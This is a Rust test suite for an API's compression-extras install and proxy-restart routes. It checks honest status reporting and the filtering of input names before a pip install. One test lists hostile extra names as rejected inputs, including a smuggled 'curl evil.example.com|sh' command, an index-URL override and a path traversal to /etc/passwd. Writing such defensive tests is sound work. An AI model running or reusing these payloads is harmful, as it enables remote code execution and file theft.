//! Contract tests for the headroom extras and restart surface.
//!
//! The property every test here defends is the same one: this build detects for
//! real and mutates nothing. A `GET` may only report what the host actually
//! holds, and a `POST` must refuse in a way a caller cannot mistake for success
//! — because a user who believes compression is active, and is not, pays for
//! full-size requests without knowing it.
//!
//! The `GET` assertions are deliberately shape-and-invariant assertions rather
//! than value assertions: whether this machine has Python 3.10+, or
//! `headroom-ai`, is a property of the machine. Asserting either way would make
//! the suite pass or fail on the developer's environment instead of on the code.
//!
//! Two POSTs (`restart`, `start`) assume the binary is absent. GitHub's Ubuntu image has it, so
//! those tests skip on a host that would find one — spawning a real proxy is not the contract they
//! pin, and `headroom_live.rs` covers the installed path with stand-ins.

#![allow(
    clippy::future_not_send,
    reason = "actix test services are single-threaded and not Send"
)]
#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::indexing_slicing,
    reason = "test assertions read clearer with direct unwrap than with error plumbing"
)]

use actix_web::{
    App,
    body::to_bytes,
    http::{Method, StatusCode, header},
    test, web,
};
use serde_json::Value;

use nullrouter_api::{AppConfig, RuntimeClient, StateClient, TunnelManager, configure};

type TestResult<T = ()> = Result<T, Box<dyn std::error::Error>>;

/// A closed loopback port: nothing here reads state or runtime, so the clients
/// exist only to satisfy the app's `app_data`.
const UNREACHABLE_STATE_ADDR: &str = "127.0.0.1:1";

const fn app_config() -> AppConfig {
    AppConfig::new("0.5.20")
}

async fn request_json(method: Method, uri: &str, body: &str) -> TestResult<(StatusCode, Value)> {
    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(app_config()))
            .app_data(web::Data::new(StateClient::new(UNREACHABLE_STATE_ADDR)))
            .app_data(web::Data::new(RuntimeClient::new(UNREACHABLE_STATE_ADDR)))
            .app_data(web::Data::new(TunnelManager::new()))
            .configure(configure),
    )
    .await;
    let req = test::TestRequest::default()
        .method(method)
        .uri(uri)
        .insert_header((header::CONTENT_TYPE, "application/json"))
        .set_payload(body.to_owned())
        .to_request();

    let res = test::call_service(&app, req).await;
    let status = res.status();
    let body = to_bytes(res.into_body()).await?;
    let json = serde_json::from_slice(&body)?;
    Ok((status, json))
}

async fn get_json(uri: &str) -> TestResult<(StatusCode, Value)> {
    request_json(Method::GET, uri, "").await
}

async fn post_json(uri: &str, body: &str) -> TestResult<(StatusCode, Value)> {
    request_json(Method::POST, uri, body).await
}

fn field<'a>(json: &'a Value, name: &str) -> TestResult<&'a Value> {
    json.get(name)
        .ok_or_else(|| test_error(format!("missing field {name}")))
}

fn test_error(message: impl Into<String>) -> Box<dyn std::error::Error> {
    Box::new(std::io::Error::other(message.into()))
}

/// Whether this host has a `headroom` binary the production search would find.
///
/// Two tests below pin the *not-installed* contract. GitHub's Ubuntu image has the binary, so those
/// tests would otherwise spawn a real proxy on :8787 and fail. Skipping them on a host that has the
/// binary is the honest answer: the contract cannot be exercised there. The installed path is covered
/// by `headroom_live.rs` with stand-in executables.
fn host_has_headroom() -> bool {
    let path_dirs = std::env::var_os("PATH")
        .map(|path| std::env::split_paths(&path).collect::<Vec<_>>())
        .unwrap_or_default();
    let mut extras = vec![
        std::path::PathBuf::from("/usr/local/bin"),
        std::path::PathBuf::from("/opt/homebrew/bin"),
        std::path::PathBuf::from("/usr/bin"),
        std::path::PathBuf::from("/bin"),
    ];
    if let Some(home) = std::env::var_os("HOME") {
        extras.push(std::path::Path::new(&home).join(".local").join("bin"));
    }
    path_dirs
        .into_iter()
        .chain(extras)
        .any(|dir| dir.join("headroom").is_file())
}

#[actix_rt::test]
async fn extras_reports_the_available_compression_extras_and_python_detection() -> TestResult {
    // Given: whatever Python and headroom-ai this machine happens to hold.

    // When: the dashboard asks what compression extras exist and which are on.
    let (status, body) = get_json("/api/headroom/extras").await?;

    // Then: the upstream shape is present, with the closed extras list.
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        field(&body, "available")?,
        &serde_json::json!(["code", "ml"])
    );
    assert!(field(&body, "installed")?.is_boolean());
    // `version` is a string or null — never absent, never a fabricated "0.0.0".
    let version = field(&body, "version")?;
    assert!(
        version.is_null() || version.is_string(),
        "version should be a string or null, got {version}"
    );

    // Every advertised extra has a reported state, so no row renders as unknown.
    let extras = field(&body, "extras")?
        .as_object()
        .ok_or_else(|| test_error("extras should be an object"))?;
    for extra in ["code", "ml"] {
        let state = extras
            .get(extra)
            .ok_or_else(|| test_error(format!("extras.{extra} missing")))?;
        assert!(state.is_boolean(), "extras.{extra} should be a boolean");
    }

    // Python detection is reported as a path or an explicit null, alongside the
    // minimum this build requires, so the panel can name what is missing.
    let python = field(&body, "python")?;
    assert!(
        python.is_null() || python.is_string(),
        "python should be a path or null, got {python}"
    );
    assert_eq!(field(&body, "pythonMinVersion")?, "3.10");

    // An extra cannot be installed while headroom-ai is not: that combination
    // would be a self-contradictory report.
    if !field(&body, "installed")?.as_bool().unwrap_or(false) {
        for extra in ["code", "ml"] {
            assert_eq!(
                extras.get(extra),
                Some(&Value::Bool(false)),
                "extras.{extra} claims installed while headroom-ai is not"
            );
        }
        assert!(field(&body, "version")?.is_null());
    }

    // Both are advertised as supported now, which is what tells a panel built against the
    // earlier build that its install and restart controls do something.
    assert_eq!(field(&body, "installSupported")?, true);
    assert_eq!(field(&body, "restartSupported")?, true);
    assert!(
        field(&body, "installMessage")?
            .as_str()
            .is_some_and(|message| !message.is_empty())
    );
    Ok(())
}

#[actix_rt::test]
async fn extras_log_query_returns_the_install_log_tail() -> TestResult {
    // Given: this build never writes an install log, but one may exist from another
    // process sharing the same data directory.

    // When: the panel polls for install progress.
    let (status, body) = get_json("/api/headroom/extras?log=1").await?;

    // Then: a `log` string is always present — empty when no log exists, which
    // is upstream's behaviour for an absent file.
    assert_eq!(status, StatusCode::OK);
    let log = field(&body, "log")?;
    assert!(log.is_string(), "log should be a string, got {log}");
    // The extras report must not leak into the log branch: `?log=1` answers
    // only the log, as upstream's early return does.
    assert!(body.get("available").is_none());

    // Where it was read from is stated, so an empty log is explainable.
    let path = field(&body, "logPath")?;
    assert!(path.is_null() || path.is_string());
    if path.is_null() {
        assert_eq!(log, "", "no log file, so there can be no log content");
    }
    Ok(())
}

#[actix_rt::test]
async fn extras_ignores_an_unrelated_query_and_reports_detection() -> TestResult {
    // Given: only `log=1` selects the log branch upstream.

    // When: another value is passed.
    let (status, body) = get_json("/api/headroom/extras?log=0&unknown=x").await?;

    // Then: the detection report is returned, not the log.
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        field(&body, "available")?,
        &serde_json::json!(["code", "ml"])
    );
    assert!(body.get("log").is_none());
    Ok(())
}

#[actix_rt::test]
async fn install_rejects_a_malformed_body_before_answering_about_extras() -> TestResult {
    // Given: a caller sends JSON that does not parse.

    // When: the install endpoint receives it.
    let (status, body) = post_json("/api/headroom/extras", "{\"extras\": [").await?;

    // Then: it is a bad request, not a considered refusal — the request was
    // never understood, so nothing about extras is reported.
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert_eq!(field(&body, "error")?, "Invalid JSON body");
    assert!(body.get("spec").is_none());
    Ok(())
}

#[actix_rt::test]
async fn an_empty_extras_list_still_installs_the_proxy_base() -> TestResult {
    // Given: upstream installs the `proxy` base for an empty list, so "empty" is not the same
    // as "nothing to do". This machine has a Python but no pip module, so the attempt fails —
    // which is the point: the spec that was attempted has to be the base one.

    // When: an empty list is posted.
    let (status, body) = post_json("/api/headroom/extras", r#"{"extras":[]}"#).await?;

    // Then: the base requirement is what was attempted, and the failure names why.
    assert_eq!(field(&body, "requested")?, &serde_json::json!([]));
    assert_eq!(field(&body, "spec")?, "headroom-ai[proxy]");
    assert!(
        status == StatusCode::OK
            || status == StatusCode::BAD_GATEWAY
            || status == StatusCode::SERVICE_UNAVAILABLE
            || status == StatusCode::CONFLICT,
        "unexpected status {status}: {body}"
    );
    if status != StatusCode::OK {
        // A failure must carry a code a panel can branch on rather than only prose.
        assert_eq!(field(&body, "success")?, false);
        assert!(
            field(&body, "code")?
                .as_str()
                .is_some_and(|code| !code.is_empty()),
            "{body}"
        );
    }
    Ok(())
}

#[actix_rt::test]
async fn an_unrecognised_extra_is_named_rather_than_passed_to_pip() -> TestResult {
    // Given: a request for both compression extras plus a name this build does not track. That
    // name must not reach the requirement string: it is the one part of a pip invocation a
    // caller influences, and an unfiltered name there is an arbitrary-package install.

    // When: it is posted.
    let (_status, body) = post_json(
        "/api/headroom/extras",
        r#"{"extras":["ml","image","code"]}"#,
    )
    .await?;

    // Then: the recognised extras are echoed, the unrecognised one is called out rather than
    // silently dropped, and the requirement contains only the closed-list names.
    assert_eq!(
        field(&body, "requested")?,
        &serde_json::json!(["ml", "code"])
    );
    assert_eq!(field(&body, "ignored")?, &serde_json::json!(["image"]));
    assert_eq!(field(&body, "spec")?, "headroom-ai[proxy,ml,code]");
    assert!(
        !field(&body, "spec")?
            .as_str()
            .is_some_and(|spec| spec.contains("image")),
        "an unrecognised name reached the requirement: {body}"
    );
    Ok(())
}

#[actix_rt::test]
async fn a_hostile_extra_name_never_reaches_the_requirement() -> TestResult {
    // Given: the shapes that would turn an install into something else — another index, a local
    // wheel, a second requirement, a shell metacharacter.
    for hostile in [
        "--index-url=https://evil.example.com",
        "-r/tmp/requirements.txt",
        "ml];curl evil.example.com|sh;[",
        "https://evil.example.com/x.whl",
        "../../../etc/passwd",
    ] {
        let payload = serde_json::json!({ "extras": [hostile] }).to_string();

        // When: it is posted.
        let (_status, body) = post_json("/api/headroom/extras", &payload).await?;

        // Then: it is reported as ignored, and the requirement is the untouched base.
        assert_eq!(
            field(&body, "spec")?,
            "headroom-ai[proxy]",
            "{hostile:?} changed the requirement: {body}"
        );
        assert_eq!(
            field(&body, "ignored")?,
            &serde_json::json!([hostile]),
            "{hostile:?} was not reported as ignored: {body}"
        );
    }
    Ok(())
}

#[actix_rt::test]
async fn install_tolerates_a_body_with_no_extras_field() -> TestResult {
    // Given: upstream treats a missing or wrongly-typed `extras` as "none
    // requested" rather than an error.

    // When: bodies without a usable list arrive, including an absent body.
    let (empty_status, empty) = post_json("/api/headroom/extras", "{}").await?;
    let (typed_status, typed) = post_json("/api/headroom/extras", r#"{"extras":"ml"}"#).await?;
    let (absent_status, absent) = post_json("/api/headroom/extras", "").await?;

    // Then: each is treated as "none requested" — never a 400, which would blame the caller for
    // a body upstream accepts.
    for (status, body) in [
        (empty_status, &empty),
        (typed_status, &typed),
        (absent_status, &absent),
    ] {
        assert_ne!(status, StatusCode::BAD_REQUEST, "{body}");
        assert_eq!(field(body, "requested")?, &serde_json::json!([]));
        assert_eq!(field(body, "spec")?, "headroom-ai[proxy]");
    }
    Ok(())
}

#[actix_rt::test]
async fn restart_names_the_url_it_judged_and_the_dependency_it_lacks() -> TestResult {
    if host_has_headroom() {
        // The not-installed contract cannot be exercised on a host that has the binary.
        return Ok(());
    }
    // Given: no HEADROOM_URL override, so the default loopback URL applies and upstream's
    // external-proxy check passes. The headroom binary is not installed on this machine.

    // When: a restart is requested.
    let (status, body) = post_json("/api/headroom/restart", "").await?;

    // Then: 503 rather than 501 — the capability exists and the binary does not, and a panel has
    // to tell those apart because one is fixed by installing something.
    assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE, "{body}");
    assert_eq!(field(&body, "success")?, false);
    assert_eq!(field(&body, "code")?, "NOT_INSTALLED");
    // The URL and port that were evaluated, so the message is checkable.
    assert_eq!(field(&body, "url")?, "http://localhost:8787");
    assert_eq!(field(&body, "port")?, 8787);
    // And the error names the command that fixes it.
    assert!(
        field(&body, "error")?
            .as_str()
            .is_some_and(|error| error.contains("pip install headroom-ai")),
        "{body}"
    );
    Ok(())
}

#[actix_rt::test]
async fn no_route_claims_a_running_proxy_when_none_is_running() -> TestResult {
    if host_has_headroom() {
        return Ok(());
    }
    // Given: headroom is not installed here, so nothing can be started. The invariant that
    // matters is unchanged from when these routes were refusals: nothing may report a live
    // proxy, because a user who believes compression is on is billed for full-size requests.

    // When: the proxy-lifecycle routes are called, then status is read.
    //
    // Order matters, and this is the whole reason the case is written this way. `/api/headroom/extras`
    // *installs*: given a working pip and network it really fetches `headroom-ai[proxy,ml]`. Calling it
    // first — as this case used to — destroyed the precondition the remaining assertions rest on, so
    // `start` and `restart` then genuinely launched a proxy and returned 200. The guard at the top of
    // the function could not catch that, because it samples the state before the install happens. So
    // every route that must observe an absent binary is called before the one that can create it.
    // Re-checked immediately before the requests, not only at function entry. A sibling in this
    // binary (`an_empty_extras_list_still_installs_the_proxy_base` and its neighbours) really
    // pip-installs, and if it finished while this case was waiting to be scheduled the contract
    // is already unexercisable. The skip at the top of the function cannot see that.
    if host_has_headroom() {
        return Ok(());
    }
    let (restart_status, restart) = post_json("/api/headroom/restart", "").await?;
    let (start_status, start) = post_json("/api/headroom/start", "").await?;
    let (stop_status, stop) = post_json("/api/headroom/stop", "").await?;
    let (status_status, status_body) = get_json("/api/headroom/status").await?;

    // Then: the two that need an installed binary fail, and each names a cause.
    for (status, body) in [(restart_status, &restart), (start_status, &start)] {
        assert!(
            status.is_client_error() || status.is_server_error(),
            "expected a failure with no binary installed, got {status}: {body}"
        );
        assert_eq!(field(body, "success")?, false);
        assert!(
            field(body, "code")?
                .as_str()
                .is_some_and(|code| !code.is_empty()),
            "{body}"
        );
    }

    // Stop succeeds, because stopping nothing is not a failure — and it must not claim to have
    // been running.
    assert_eq!(stop_status, StatusCode::OK, "{stop}");
    assert_eq!(field(&stop, "success")?, true);
    assert_eq!(field(&stop, "running")?, false);

    // And status agrees: no pid, not running, not healthy.
    assert_eq!(status_status, StatusCode::OK);
    assert_eq!(field(&status_body, "running")?, false, "{status_body}");
    assert_eq!(field(&status_body, "healthy")?, false, "{status_body}");
    assert_eq!(field(&status_body, "state")?, "stopped", "{status_body}");
    // `managedPid` stays present-and-null rather than absent: it was always serialised, and a
    // panel that reads it would see `undefined` instead of a value if it vanished.
    assert_eq!(
        status_body.get("managedPid"),
        Some(&serde_json::Value::Null),
        "{status_body}"
    );
    Ok(())
}

#[actix_rt::test]
async fn extras_answers_preflight_so_the_dashboard_can_post() -> TestResult {
    // Given: the dashboard posts JSON cross-origin in some deployments.

    // When: the browser preflights the extras and restart routes.
    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(app_config()))
            .app_data(web::Data::new(StateClient::new(UNREACHABLE_STATE_ADDR)))
            .app_data(web::Data::new(RuntimeClient::new(UNREACHABLE_STATE_ADDR)))
            .app_data(web::Data::new(TunnelManager::new()))
            .configure(configure),
    )
    .await;
    for uri in ["/api/headroom/extras", "/api/headroom/restart"] {
        let req = test::TestRequest::default()
            .method(Method::OPTIONS)
            .uri(uri)
            .to_request();
        let res = test::call_service(&app, req).await;

        // Then: preflight succeeds with no body.
        assert_eq!(res.status(), StatusCode::NO_CONTENT, "{uri}");
        assert!(
            res.headers()
                .contains_key(header::ACCESS_CONTROL_ALLOW_METHODS),
            "{uri} preflight is missing the allowed methods"
        );
    }
    Ok(())
}
